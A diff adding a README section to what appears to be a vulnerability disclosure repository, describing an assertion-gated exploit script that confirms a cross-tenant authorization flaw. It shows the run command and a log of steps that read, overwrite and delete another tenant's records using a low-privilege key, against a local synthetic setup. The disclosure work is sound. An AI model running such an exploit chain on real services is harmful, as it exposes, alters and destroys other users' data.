@@ -53,6 +53,41 @@ BASE=http://127.0.0.1:8000 KEY=<keyB> VICTIM=alice_tenant ./poc/poc_cross_tenant
 (`bob_tenant`), provisions an operator-created `role=user` account, and prints both keys.
 Everything is local, synthetic, and disposable — `docker compose down -v` cleans up.
 
+## Automated exploit (CVE-grade proof)
+
+`poc/exploit.py` is the assertion-gated exploit: 14 checks over live HTTP, exit 0
+only when the whole chain is confirmed. It plants the write/delete target with the
+**victim's** key so ownership is established independently of the attacker, records
+request IDs + UTC timestamps into a JSON transcript, and prints the transcript hash.
+
+```bash
+BASE=http://127.0.0.1:8000 \
+ATTACKER_KEY=<role=user key> \
+VICTIM_KEY=<key owned by another principal> \
+VICTIM=alice_tenant \
+./poc/exploit.py --json transcript.json
+```
+
+```
+[PASS] 00 attacker identity: role='user'
+[PASS] 01 enumerate tenants: victim 'alice_tenant' disclosed among [...]
+[PASS] 02 victim creates owned record: memory_id=… created with VICTIM key
+[PASS] 03 read foreign memory by id
+[PASS] 03 read foreign history
+[PASS] 03 read by namespace
+[PASS] 03 semantic search into foreign namespace
+[PASS] 04 control: unfiltered listing denied: status=403
+[PASS] 05 overwrite foreign memory
+[PASS] 05 owner observes injected content
+[PASS] 06 delete foreign memory
+[PASS] 06 owner record gone
+result: CONFIRMED  steps=14  failures=0
+transcript_sha256: 51543c0d…f8ba
+```
+
+The committed run is `evidence/04_exploit_transcript.{txt,json}`; hashes in
+`evidence/MANIFEST.txt` (`04_exploit_transcript.json` = `23a34152…c666`).
+
 ## Disclosure timeline
 
 | Date (UTC) | Event |
